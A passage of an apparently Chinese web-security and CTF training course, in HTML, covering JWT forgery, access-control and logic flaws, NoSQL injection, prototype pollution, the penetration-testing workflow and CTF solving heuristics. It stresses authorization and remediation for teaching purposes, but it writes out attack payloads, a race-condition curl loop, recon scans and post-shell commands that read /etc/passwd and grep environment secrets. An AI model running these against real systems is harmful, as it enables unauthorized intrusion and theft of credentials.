+<ol class="steps"><li>先看 token 结构：JWT 就 base64 解开 header/payload，看 role 之类的字段。</li><li>改 payload 里的权限字段，看签名是否被校验（不校验直接过 = 最简单）。</li><li>查 alg 是否接受 none，用 jwt_tool -X a 试。</li><li>用常见弱口令爆破 HS256 密钥。</li><li>看 kid/x5u/jku 等字段是否可控。</li><li>以上都不行，再考虑 session 伪造或反序列化。</li></ol>
+<div class="code"><div class="cbar">JWT 结构（自己拆一遍） · python</div><pre><code>import base64, json
+tok = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInJvbGUiOiJ1c2VyIn0.xxxxx"
+h, p, s = tok.split(".")
+pad = lambda x: x + "=" * (-len(x) % 4)
+print(json.loads(base64.urlsafe_b64decode(pad(h))))
+print(json.loads(base64.urlsafe_b64decode(pad(p))))
+# 输出：{'alg': 'HS256', 'typ': 'JWT'}  {'uid': 1, 'role': 'user'}
+# 注意：payload 是"明文"，只是 base64，不是加密</code></pre></div>
+<blockquote class="note">💡 记住一个底层事实：<b>JWT 的安全性 100% 依赖签名校验</b>。payload 谁都能看、谁都能改。所有攻击最终都是「让服务器接受一个我没签过的 payload」。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://portswigger.net/web-security/jwt" target="_blank" rel="noopener">PortSwigger · JWT</a></li><li><a href="https://github.com/ticarpi/jwt_tool" target="_blank" rel="noopener">jwt_tool</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>alg=none 为什么能绕过验证？服务器该怎么防？</li><li>RS256 混淆攻击的前提是什么？</li><li>为什么 session id 必须足够随机？</li><li>kid 字段能怎么被利用？</li><li>JWT 的 payload 是加密的吗？</li></ol>
+</article>
+<article id="l-p5l16">
+<h2>逻辑漏洞与越权</h2>
+<div class="meta">约 30 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>理解「代码没写错，但业务逻辑被绕过」，建立挖逻辑漏洞的固定流程。</p></div>
+<p>逻辑漏洞没有「注入点」这种明确标志，它的定义是：<b>功能按设计跑起来了，但某个假设被攻击者破坏了</b>——比如「用户只会改自己的 id」「金额只能是正数」「支付必须先付款」。</p>
+<div class="tablewrap"><div class="tcap">常见类型</div><table><thead><tr><th>类型</th><th>具体表现</th><th>怎么试</th></tr></thead><tbody><tr><td>水平越权</td><td>改 id 看别人的订单/资料</td><td>把用户 id 改成相邻值</td></tr><tr><td>垂直越权</td><td>普通用户直接调管理员接口</td><td>抓管理员的请求，换成普通账号重放</td></tr><tr><td>价格篡改</td><td>改单价、数量为负、优惠券叠加</td><td>改请求体里的金额字段</td></tr><tr><td>支付绕过</td><td>跳过支付步骤、改金额、重放</td><td>删掉中间步骤直接请求最后一步</td></tr><tr><td>验证码问题</td><td>复用、爆破、短信轰炸、前端校验</td><td>同一验证码用两次；写成 0000–9999 爆破</td></tr><tr><td>流程竞争</td><td>同一优惠券并发使用多次</td><td>多线程同时发请求</td></tr></tbody></table></div>
+<h3>挖逻辑漏洞的四步</h3>
+<ol class="steps"><li>正常走一遍完整流程，用 Burp 记下<b>每一个</b>请求（注册、登录、下单、支付、退款）。</li><li>逐个问：这一步的「前提」是服务器保证的，还是前端/上一步保证的？</li><li>改掉你觉得「不该被改」的参数：id、数量、金额、状态、时间、角色。</li><li>重复、并发、乱序地发请求——很多漏洞只在「同时发生」时出现。</li></ol>
+<div class="code"><div class="cbar">一个典型的越权 · text</div><pre><code># 正常：GET /api/order?id=1001      （当前用户自己的订单）
+# 越权：GET /api/order?id=1002      （别人的订单，服务器没校验归属）
+
+# 修复：从 session 里取用户 id，而不是从请求里取
+# 错误：SELECT * FROM orders WHERE id = $_GET['id']
+# 正确：SELECT * FROM orders WHERE id = ? AND user_id = ?</code></pre></div>
+<div class="code"><div class="cbar">并发竞争的最小验证 · bash</div><pre><code># 用同一张优惠券同时发 20 个请求，看是否都被接受
+seq 20 | xargs -P 20 -I{} curl -s -b "session=..." \
+  -X POST https://target/api/coupon/use -d "code=XXXX" -o /dev/null -w "%{http_code}\n"
+
+# 原理：后端顺序是「查是否已用 -&gt; 用掉 -&gt; 更新状态」
+# 并发时多个请求在「查」之后、更新之前都通过了检查</code></pre></div>
+<blockquote class="note">💡 逻辑漏洞无法靠字典扫，全靠对业务流程的理解。<b>这类题最考耐心和观察力，也最接近真实的渗透测试</b>——因为它是真正「读懂系统」的体现。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>水平越权和垂直越权的区别？</li><li>「前端隐藏了按钮」为什么不算权限控制？</li><li>并发竞争利用的是什么缺陷？</li><li>挖逻辑漏洞的第一步是什么？</li><li>越权漏洞在代码层应该怎么修？</li></ol>
+</article>
+<article id="l-p5l17">
+<h2>NoSQL 注入</h2>
+<div class="meta">约 25 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>理解 MongoDB 查询对象的注入方式，以及和 SQL 注入的共同点。</p></div>
+<p>NoSQL 数据库（MongoDB 最常见）用「对象」来描述查询条件。如果后端把用户输入直接拼进查询对象，攻击者就能构造出「匹配任意值」的条件——这和 SQL 注入同源，只是注入的载体从字符串换成了对象。</p>
+<div class="code"><div class="cbar">MongoDB 注入原理 · js</div><pre><code>// 正常查询
+db.users.find({ username: name, password: pw })
+
+// 攻击：让 password 变成「不等于 1」的查询对象
+// 请求：?username=admin&amp;password[$ne]=1
+// 后端解析成 { username: 'admin', password: { $ne: 1 } }
+// -&gt; 只要密码不等于 1 就匹配，等于绕过密码校验
+
+// 其他常用操作符
+?username[$regex]=^adm&amp;password[$ne]=1
+?username[$gt]=&amp;password[$gt]=</code></pre></div>
+<div class="tablewrap"><div class="tcap">常用操作符与含义</div><table><thead><tr><th>操作符</th><th>含义</th><th>注入用法</th></tr></thead><tbody><tr><td>$ne</td><td>不等于</td><td>$ne=1 让密码校验永远为真</td></tr><tr><td>$gt / $lt</td><td>大于 / 小于</td><td>$gt= 空串匹配任何存在的值</td></tr><tr><td>$regex</td><td>正则匹配</td><td>逐字符猜用户名/密码</td></tr><tr><td>$exists</td><td>字段存在</td><td>探测字段</td></tr><tr><td>$where</td><td>JS 表达式（旧版）</td><td>直接执行 JS，危害最大</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">后端漏洞代码与修复 · js</div><pre><code>// 危险：直接把 req.body 当年的查询条件
+app.post('/login', (req, res) =&gt; {
+  db.collection('users').findOne({ username: req.body.username, password: req.body.password })
+    .then(u =&gt; res.send(u ? 'ok' : 'fail'));
+});
+
+// 修复 1：强制把参数转成字符串
+const username = String(req.body.username);
+// 修复 2：用 express-mongo-sanitize 去掉 $ 开头的键
+// 修复 3：密码比对在应用层做（hash 比对），不要拼进查询条件</code></pre></div>
+<blockquote class="note">💡 CTF 里 NoSQL 注入的入口通常是登录框；用 <code>[$ne]=1</code> 或 <code>[$regex]</code> 试一下就知道。判据和 SQL 盲注一样：<b>看响应差异</b>。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://portswigger.net/web-security/nosql-injection" target="_blank" rel="noopener">PortSwigger · NoSQL injection</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>$ne 在 MongoDB 里是什么语义？</li><li>为什么 ?password[$ne]=1 会被解析成对象？</li><li>NoSQL 注入和 SQL 注入共同的根源是什么？</li><li>怎么防御 NoSQL 注入？</li></ol>
+</article>
+<article id="l-p5l18">
+<h2>原型链污染</h2>
+<div class="meta">约 35 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>理解 Object.prototype 被污染后为什么会影响全局，以及常见入口与危害。</p></div>
+<p>JavaScript 里所有普通对象都继承自 <code>Object.prototype</code>。如果你能把一个属性写进这个「公共祖先」，那么之后<b>任何</b>对象访问这个属性都会拿到它——即使你根本没在自己身上定义过。很多「深拷贝 / 合并配置」的函数就会无意中提供这个写入能力。</p>
+<div class="code"><div class="cbar">漏洞原理（不安全的 merge） · js</div><pre><code>function merge(target, source) {
+  for (const key in source) {
+    if (typeof source[key] === "object") {
+      target[key] = target[key] || {};
+      merge(target[key], source[key]);   // ← 没有过滤 __proto__
+    } else {
+      target[key] = source[key];
+    }
+  }
+}
+
+merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
+console.log({}.isAdmin);   // true  —— 所有对象都被污染了</code></pre></div>
+<div class="code"><div class="cbar">为什么「所有对象」都受影响 · js</div><pre><code>// 每个对象字面量 { } 的原型都是 Object.prototype
+const a = {};
+const b = {};        // a、b、c 都共享同一个 Object.prototype
+console.log(a.isAdmin);  // true
+console.log(b.isAdmin);  // true
+
+// prototype vs __proto__
+// Foo.prototype           : 构造函数的「原型对象」，给它加属性影响所有实例
+// obj.__proto__           : 对象自身指向的原型（通常就是 Foo.prototype）
+// 所以 obj.__proto__.x = 1  等价于给原型链上层加属性</code></pre></div>
+<div class="tablewrap"><div class="tcap">常见入口与危害</div><table><thead><tr><th>入口</th><th>说明</th></tr></thead><tbody><tr><td>JSON 参数合并</td><td>如要求前端把配置对象 POST 上来，后端 deepMerge</td></tr><tr><td>URL 参数解析</td><td>qs 库老版本对 a[__proto__][x]=1 的解析</td></tr><tr><td>模板引擎配置合并</td><td>污染 options 影响后续渲染</td></tr><tr><td>危害：模板注入</td><td>污染模板引擎的设置，导致代码执行</td></tr><tr><td>危害：沙箱逃逸</td><td>污染子进程选项（如 shell、env）</td></tr><tr><td>危害：绕过校验</td><td>污染 isAdmin 之类的判断字段</td></tr></tbody></table></div>
+<h3>怎么修</h3>
+<ul><li>合并前过滤键：拒绝 <code>__proto__</code>、<code>constructor</code>、<code>prototype</code>。</li><li>用 <code>Object.create(null)</code> 创建无原型对象存放配置。</li><li>用 <code>Object.defineProperty</code> 定义属性，或用 <code>Map</code> 代替普通对象。</li><li>依赖库要升级：lodash、qs 等历史版本已有修复。</li><li>解析 JSON 后做一次递归的白名单过滤。</li></ul>
+<blockquote class="note">💡 原型链污染题在 Node.js 方向很常见。判断方法：<b>找「合并 / 深拷贝」的入口</b>；利用的关键是「污染完能不能影响后续某个危险操作」，单靠污染本身通常没意义。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://portswigger.net/web-security/prototype-pollution" target="_blank" rel="noopener">PortSwigger · Prototype pollution</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>__proto__ 和 prototype 的区别？</li><li>为什么污染后「所有对象」都受影响？</li><li>原型链污染最常见的入口是什么？</li><li>污染之后通常要怎么才能造成实际危害？</li><li>列出两种防御方式。</li></ol>
+</article></section>
+<section class="mod" id="m-p7"><h1>PART 9 · 渗透流程与解题方法论</h1><div class="sub">第 18–20 周 · 11 节</div><blockquote class="note">Web 安全不只有漏洞：真实的渗透是一条从授权、信息收集、验证、利用到报告的完整流程，CTF 解题只是其中一个片段。这一 PART 先把流程走通，再给做题的方法论。</blockquote><article id="l-p7w1">
+<h2>渗透测试全流程：一次授权的测试长什么样</h2>
+<div class="meta">约 30 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>能说出渗透测试的六个阶段，以及每个阶段「做什么、产出什么、边界在哪」。</p></div>
+<p>CTF 题目只是「给你一个入口，把 flag 找出来」。真实工作里，一次测试是从<b>授权</b>开始的，中间有大量不是打漏洞的工作：范围确认、资产梳理、验证记录、风险沟通、修复复测。这一节先把整条链走一遍。</p>
+<div class="tablewrap"><div class="tcap">六个阶段（PTES 简化版）</div><table><thead><tr><th>阶段</th><th>做什么</th><th>产出</th></tr></thead><tbody><tr><td>① 前期沟通</td><td>确认授权书、范围（域名/IP/时间窗）、禁止项（社工、破坏性操作）</td><td>授权书、测试范围表</td></tr><tr><td>② 信息收集</td><td>子域、端口、指纹、目录、历史泄露（GitHub/备份）、员工信息</td><td>资产清单与攻击面地图</td></tr><tr><td>③ 威胁建模</td><td>按资产价值与暴露面排序，挑最可能成功的路径</td><td>优先级列表</td></tr><tr><td>④ 漏洞验证</td><td>每个疑似点做最小验证，记录请求/响应证据</td><td>漏洞清单（含复现步骤）</td></tr><tr><td>⑤ 利用与后渗透</td><td>拿到权限后评估影响范围（绝不越权、绝不破坏）</td><td>影响描述与证据</td></tr><tr><td>⑥ 报告与复测</td><td>风险评级、修复建议、复测确认</td><td>报告 + 复测记录</td></tr></tbody></table></div>
+<p>CTF 里你只做 ④（验证）和 ⑤（拿到 flag）；但找工作、打真实项目、做 SRC 时，②③⑥ 才是拉开差距的地方。</p>
+<ol class="steps"><li>把六个阶段抄进笔记，每个阶段后面写一句「这一步的产出是什么」。</li><li>找一份公开的授权测试模板（SOW）读一遍，体会「范围」写得多细。</li><li>想一想：如果没有授权就动手，你会踩到哪些法律红线（回到 p0l2）。</li></ol>
+<blockquote class="note">💡 「Web 不只是漏洞」——攻击链的每一环都要有依据。真实测试里，能说清「我怎么发现的、影响是什么、怎么修」比多打一个 shell 更有价值。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>渗透测试的六个阶段分别是什么？</li><li>为什么「威胁建模」排在验证之前？</li><li>真实测试里，为什么报告的价值不低于打点？</li></ol>
+</article>
+<article id="l-p7w2">
+<h2>信息收集与资产测绘：先画地图再动手</h2>
+<div class="meta">约 40 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>能对一个授权目标做一轮基础信息收集，产出一张「资产 + 端口 + 指纹」清单。</p></div>
+<p>信息收集决定后面所有工作的上限。它的目标不是「扫得越多越好」，而是<b>用最少的请求画出最准的地图</b>：有哪些域名、哪些端口、什么技术栈、有没有泄露。</p>
+<div class="tablewrap"><div class="tcap">四类收集</div><table><thead><tr><th>类型</th><th>手段</th><th>常见工具</th></tr></thead><tbody><tr><td>域名与子域</td><td>证书透明度日志、字典爆破、搜索引擎</td><td>crt.sh、subfinder、amass</td></tr><tr><td>端口与服务</td><td>常见端口扫描、服务识别</td><td>nmap、masscan（授权目标）</td></tr><tr><td>Web 指纹与路径</td><td>响应头、报错页、目录探测</td><td>whatweb、dirsearch、Burp</td></tr><tr><td>公开信息</td><td>GitHub 泄露、网盘、招聘信息、历史备份</td><td>GitHub 搜索、Google dork</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">一次最小化的收集流程 · bash</div><pre><code># 1. 子域（从证书透明日志拿公开记录）
+curl -s "https://crt.sh/?q=%25.target.com&amp;output=json" | jq -r '.[].name_value' | sort -u
+
+# 2. 端口与服务
+nmap -sV -p 80,443,8080,3306,6379 target.com
+
+# 3. Web 指纹
+curl -I https://target.com/
+whatweb https://target.com/
+
+# 4. 目录与泄露（小字典先跑）
+dirsearch -u https://target.com/ -e php,bak,zip,txt</code></pre></div>
+<div class="tablewrap"><div class="tcap">产出应该长什么样</div><table><thead><tr><th>资产</th><th>端口/服务</th><th>指纹</th><th>备注</th></tr></thead><tbody><tr><td>www.target.com</td><td>443 nginx</td><td>ThinkPHP 5.0</td><td>疑似旧版本，优先验证</td></tr><tr><td>admin.target.com</td><td>443</td><td>Spring Boot + Actuator</td><td>actuator 未关闭</td></tr><tr><td>target.com</td><td>8080 Tomcat</td><td>Java 8</td><td>管理后台弱口令待验证</td></tr></tbody></table></div>
+<blockquote class="note">💡 所有收集动作都必须落在授权范围内；测完删掉本地数据。信息收集的最大风险不是「扫不到」，而是「扫了不该扫的」。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://crt.sh/" target="_blank" rel="noopener">crt.sh（证书透明度查询）</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>信息收集的四类分别是什么？</li><li>为什么说「信息收集决定后面工作的上限」？</li><li>资产清单里除了域名，还应该记录哪三类信息？</li></ol>
+</article>
+<article id="l-p7w3">
+<h2>漏洞验证与利用：把「可能」变成「已证明」</h2>
+<div class="meta">约 35 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>学会用最小验证证明一个漏洞，并记录可复现的证据。</p></div>
+<p>新人最容易犯的错是「看到一个参数就写报告说这里有注入」。验证的标准只有一条：<b>能稳定复现，且能说明影响</b>。</p>
+<div class="tablewrap"><div class="tcap">验证的三条纪律</div><table><thead><tr><th>纪律</th><th>做法</th><th>为什么</th></tr></thead><tbody><tr><td>最小化</td><td>只证明存在，不多取数据、不拖库</td><td>降低风险，也符合授权范围</td></tr><tr><td>可复现</td><td>保存原始请求/响应、时间、账号</td><td>别人能照着重放</td></tr><tr><td>有影响</td><td>说明能读到什么、改到什么</td><td>决定风险等级</td></tr><tr><td>留证据</td><td>截图 + 文本，别只留截图</td><td>报告需要原始数据</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">一条合格的验证记录 · text</div><pre><code>漏洞：订单详情水平越权
+位置：GET /api/order?id=1001（当前账号 A）
+验证：把 id 改为 1002，返回 B 用户的收货地址与手机号
+证据：原始请求 / 响应（附）、两个账号信息、时间戳
+影响：任意用户可读取他人订单与隐私信息
+建议：服务端按 session 的 user_id 过滤，并返回 403
+复测：修复后同一请求返回 403，已验证</code></pre></div>
+<blockquote class="note">💡 CTF 里「拿到 flag 就算赢」，真实测试里「能证明影响、能帮助修复」才算完成。这也是为什么同一道题，有人写报告像流水账，有人能卖出价钱。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>验证一个漏洞时，「最小化」具体指什么？</li><li>一条合格的验证记录必须包含哪些信息？</li><li>为什么证据要同时保留截图和原始文本？</li></ol>
+</article>
+<article id="l-p7w4">
+<h2>后渗透与内网：拿到 webshell 之后</h2>
+<div class="meta">约 35 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>了解拿到权限后的常见动作与边界，知道哪些能做、哪些绝对不做。</p></div>
+<p>这一步在 CTF 里常常是「读个 flag 就结束」，在真实授权测试里则要回答一个问题：<b>这个入口能造成多大影响？</b>但所有动作都要在授权范围内，且以「不破坏、不外传数据」为前提。</p>
+<div class="tablewrap"><div class="tcap">常见动作（按风险从低到高）</div><table><thead><tr><th>动作</th><th>目的</th><th>边界</th></tr></thead><tbody><tr><td>确认权限与身份</td><td>知道自己是 www-data 还是 root</td><td>只执行 id / whoami</td></tr><tr><td>读配置与凭据</td><td>评估泄露影响</td><td>只读授权范围内的文件</td></tr><tr><td>内网探测</td><td>评估横向风险</td><td>严格按范围，禁止扫办公网</td></tr><tr><td>提权验证</td><td>证明影响</td><td>只做无害 PoC，不装后门</td></tr><tr><td>权限维持</td><td>一般不在授权测试中做</td><td>需单独书面授权</td></tr><tr><td>数据外带</td><td>绝对不做</td><td>用脱敏样本证明即可</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">拿到 shell 后的前 5 条命令 · bash</div><pre><code>id                          # 我是谁
+hostname &amp;&amp; ip addr        # 我在哪
+cat /etc/passwd | head      # 有什么用户
+ls -la /var/www             # 站点目录
+env | grep -i secret        # 有没有环境变量泄露
+
+# 注意：这些命令只用于「评估影响」，不用于扩大战果</code></pre></div>
+<blockquote class="note">💡 红线：不装后门、不横向到范围外、不下载真实用户数据、不修改业务数据。CTF 里可以随便打，真实环境里每一条都要先问「授权了吗」。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>拿到 shell 后，为什么第一条命令是 id 而不是找 flag？</li><li>授权测试里哪些动作绝对不做？</li><li>「评估影响」和「扩大战果」的区别是什么？</li></ol>
+</article>
+<article id="l-p7w5">
+<h2>报告与合规：风险评级、复现步骤与修复建议</h2>
+<div class="meta">约 30 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>能写出一份让开发看得懂、改得动的漏洞报告。</p></div>
+<p>报告是渗透测试的最终交付物。开发不关心你用了什么工具，只关心三件事：<b>在哪、怎么复现、怎么修</b>。</p>
+<div class="tablewrap"><div class="tcap">一份报告的骨架</div><table><thead><tr><th>部分</th><th>写什么</th><th>常见问题</th></tr></thead><tbody><tr><td>标题</td><td>漏洞类型 + 位置（如「订单接口水平越权」）</td><td>写成「发现漏洞」</td></tr><tr><td>风险等级</td><td>CVSS 或高/中/低，给出理由</td><td>只给等级不给理由</td></tr><tr><td>复现步骤</td><td>编号步骤 + 原始请求</td><td>步骤缺登录态/参数</td></tr><tr><td>影响</td><td>能读到什么、影响多少用户</td><td>写「危害巨大」没有细节</td></tr><tr><td>修复建议</td><td>具体到代码/配置层</td><td>只写「加强校验」</td></tr><tr><td>复测</td><td>修复后同样请求的结果</td><td>没有复测</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">风险评级的一个简单口径 · text</div><pre><code>高危：无需登录即可利用；或可读取大量敏感数据；或可直接执行命令
+中危：需要普通账号；影响单个用户数据；或需要特定条件
+低危：信息泄露（版本、路径）；需要极高交互成本
+提示：仅内部信息、配置建议
+
+（正式项目用 CVSS v3.1 计算，并附向量字符串）</code></pre></div>
+<blockquote class="note">💡 写报告时想象读者是赶工期的开发：<b>他能不能照着你写的步骤，在 10 分钟内复现并改掉</b>。这才是报告的合格线。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>报告里最不能缺的三样东西是什么？</li><li>为什么修复建议要具体到代码层？</li><li>复测在流程里的作用是什么？</li></ol>
+</article>
+<article id="l-p7l1">
+<h2>拿到一道题的第一分钟：做这七件事</h2>
+<div class="meta">约 30 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>形成一套固定起手式：七件事做完，题目至少会给你三个可尝试的方向。</p></div>
+<p>新手最常见的状态是：打开题目，看一圈，不知道从哪开始。老手的区别不是更聪明，而是<b>有一套固定动作</b>。这套动作不保证解出题，但保证你不会停在「一片空白」。</p>
+<div class="tablewrap"><div class="tcap">七件事（按成本从低到高）</div><table><thead><tr><th>#</th><th>动作</th><th>看什么</th><th>常见结论</th></tr></thead><tbody><tr><td>①</td><td>读题面</td><td>题名、描述、附件、提示</td><td>题名往往就是方向（备份文件 / 源码泄露 / 弱口令）</td></tr><tr><td>②</td><td>看 URL 结构</td><td>有没有 ?id= ?file= ?url= ?page= ?cmd=</td><td>参数名直接指向漏洞类型</td></tr><tr><td>③</td><td>看页面源码</td><td>HTML 注释、隐藏 input、内联 JS</td><td>隐藏字段、flag、接口名</td></tr><tr><td>④</td><td>看 Network</td><td>页面加载了哪些接口、传了什么</td><td>可复现的请求、可疑 API</td></tr><tr><td>⑤</td><td>看响应头</td><td>Server / X-Powered-By / Set-Cookie</td><td>技术栈与框架</td></tr><tr><td>⑥</td><td>试探性输入</td><td>单引号、{{7*7}}、&lt;script&gt;、../、127.0.0.1</td><td>报错 / 回显 / 延时 = 信号</td></tr><tr><td>⑦</td><td>记录异常</td><td>报错、变长、跳转、变慢</td><td>异常就是入口</td></tr></tbody></table></div>
+<h3>七件事的手动流程</h3>
+<ol class="steps"><li>用 Burp 或 DevTools 打开题目，先<b>不要</b>着急改包，把页面完整走一遍。</li><li>把每个功能点列出来：登录、注册、搜索、上传、下载、评论、导出、设置。</li><li>对每个功能点问一句：<b>它背后可能用到哪种漏洞</b>？（见下面的功能地图）</li><li>把「URL 参数 / 表单字段 / Cookie / Header」四处的输入位置各试一次。</li><li>在笔记里写三行：这是什么类型的站、有哪些入口、我打算先试哪两个。</li></ol>
+<div class="tablewrap"><div class="tcap">功能 → 漏洞地图</div><table><thead><tr><th>功能</th><th>优先想</th></tr></thead><tbody><tr><td>搜索框 / 回显输入</td><td>XSS、SSTI、SQLi</td></tr><tr><td>登录 / 注册</td><td>弱口令、SQLi 绕过、JWT/Session 伪造、越权</td></tr><tr><td>上传头像 / 文件</td><td>文件上传绕过、图片马 + 文件包含</td></tr><tr><td>下载 / 导出</td><td>路径穿越、任意文件读取、SSRF</td></tr><tr><td>URL 预览 / 远程抓取</td><td>SSRF</td></tr><tr><td>评论 / 留言 / 昵称</td><td>存储型 XSS、SQLi</td></tr><tr><td>个人资料 / 订单</td><td>水平越权（改 id）</td></tr><tr><td>后台按钮 / 管理接口</td><td>垂直越权、逻辑漏洞</td></tr></tbody></table></div>
+<blockquote class="note">💡 七件事做完还没思路，就去看题目的「功能」本身：这个站是做什么的？每个功能背后都有一个潜在的漏洞类型。<b>先列功能，再选漏洞，比随机试 payload 快得多。</b></blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>七个起手动作里，哪三个成本最低？</li><li>为什么题名和题面文字值得先看？</li><li>「异常就是入口」怎么理解？举一个例子。</li><li>一个站有「导出 PDF」功能，你优先想哪个漏洞？</li></ol>
+</article>
+<article id="l-p7l2">
+<h2>题型识别决策树</h2>
+<div class="meta">约 35 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>用一个决策树，把「一片空白」变成「三个候选方向」，并知道每个方向花多久。</p></div>
+<p>把下面的树背下来（或者打印出来贴在显示器旁）。做题时顺着走，不要凭感觉乱试。</p>
+<div class="code"><div class="cbar">主决策树 · text</div><pre><code>题目给了源码吗？
+├─ 给了 → 直接读源码，按「入口→变量→落点→判断」四步找漏洞
+│         （PART 4 / p3l8）
+└─ 没给
+   ├─ URL 里有参数吗？
+   │   ├─ ?id= / ?uid= / ?cat=      → 先试 SQL 注入（p5l3 / p5l4）
+   │   ├─ ?file= / ?page= / ?path=   → 先试文件包含 / 路径穿越（p5l7）
+   │   ├─ ?url= / ?image= / ?link=   → 先试 SSRF（p5l9）
+   │   ├─ ?cmd= / ?exec=             → 命令执行（p5l8）
+   │   └─ ?q= / ?search= / ?name=    → XSS / SSTI（p5l5 / p5l11）
+   ├─ 有登录/注册吗？
+   │   ├─ 有 → 弱口令、SQLi 登录绕过、JWT 伪造、越权（p5l15 / p5l16）
+   │   └─ 无 → 继续往下
+   ├─ 有上传功能吗？        → 文件上传（p5l6）
+   ├─ 有 XML 输入吗？       → XXE（p5l12）
+   ├─ 前端有加密/校验逻辑？ → 读 JS，控制台直接调用绕过（p1l6 / p3l2）
+   └─ 什么都没有？
+        └─ 信息收集：目录扫描、备份文件、.git、robots.txt（p6l3）</code></pre></div>
+<div class="tablewrap"><div class="tcap">参数名 → 首选漏洞（速查）</div><table><thead><tr><th>参数名</th><th>首选</th><th>次选</th></tr></thead><tbody><tr><td>?id= / ?uid=</td><td>SQLi</td><td>越权（改成别人的 id）</td></tr><tr><td>?file= / ?page=</td><td>文件包含 / 路径穿越</td><td>任意文件读取</td></tr><tr><td>?url= / ?image= / ?link=</td><td>SSRF</td><td>命令执行（若被拼进命令）</td></tr><tr><td>?cmd= / ?exec= / ?ping=</td><td>命令执行</td><td>代码执行</td></tr><tr><td>?q= / ?search=</td><td>XSS（反射）</td><td>SQLi（拼进 like）、SSTI</td></tr><tr><td>?name= / ?msg=</td><td>XSS（存储）</td><td>SSTI</td></tr><tr><td>?lang= / ?tpl=</td><td>SSTI</td><td>文件包含</td></tr><tr><td>Cookie / Authorization</td><td>JWT 伪造 / 反序列化</td><td>越权</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">拿到 flag 位置后的第二棵树 · text</div><pre><code>需要读文件？
+├─ 有文件包含 → php://filter / 日志包含
+├─ 有 SSRF   → file:// / gopher://
+└─ 有命令执行 → cat /flag
+
+需要伪造身份？
+├─ Cookie 里是明文 → 直接改
+├─ 是 JWT          → alg=none / 弱密钥 / 算法混淆
+└─ 是序列化数据    → 反序列化（p5l13 / p5l14）
+
+需要出网但没有回显？
+├─ 写文件到 web 目录
+└─ DNSLog / HTTP 外带</code></pre></div>
+<blockquote class="note">💡 决策树的价值不是「一定对」，而是<b>把茫然变成有序的尝试列表</b>。每个分支给 2 分钟，不行就换下一个——这一步的纪律比聪明重要。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>看到 ?file= 优先试哪两类漏洞？</li><li>有上传功能时，第一件事是判断什么？</li><li>为什么决策树要「每个分支只花几分钟」？</li><li>有「记住我」的登录，你优先看什么？</li></ol>
+</article>
+<article id="l-p7l3">
+<h2>Web 题切入点清单（打印版）</h2>
+<div class="meta">约 30 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>把这两张清单存进笔记，做题时逐条对照，避免漏掉入口。</p></div>
+<div class="tablewrap"><div class="tcap">按「输入位置」列清单</div><table><thead><tr><th>输入位置</th><th>可能注入的漏洞</th><th>怎么试</th></tr></thead><tbody><tr><td>URL 参数</td><td>SQLi / SSTI / 文件包含 / SSRF / 命令执行</td><td>改一个字符看报错/回显/长度</td></tr><tr><td>POST 表单</td><td>SQLi / XSS / 上传 / 反序列化</td><td>Burp 里改字段重放</td></tr><tr><td>Cookie / Header</td><td>反序列化 / 伪造身份 / XFF 伪造 / SQLi</td><td>逐个头改一遍</td></tr><tr><td>User-Agent</td><td>SQLi（有些题存 UA 进库）/ 命令执行</td><td>换 UA 看行为变化</td></tr><tr><td>文件名</td><td>上传绕过 / 路径穿越</td><td>改扩展名、改目录部分</td></tr><tr><td>JSON 字段</td><td>原型链污染 / 反序列化 / 逻辑越权</td><td>加 __proto__ / 改 id</td></tr><tr><td>XML 输入</td><td>XXE</td><td>加 DOCTYPE 实体</td></tr><tr><td>Referer</td><td>CSRF 校验旁路 / 逻辑校验</td><td>换成内网/管理员域名</td></tr></tbody></table></div>
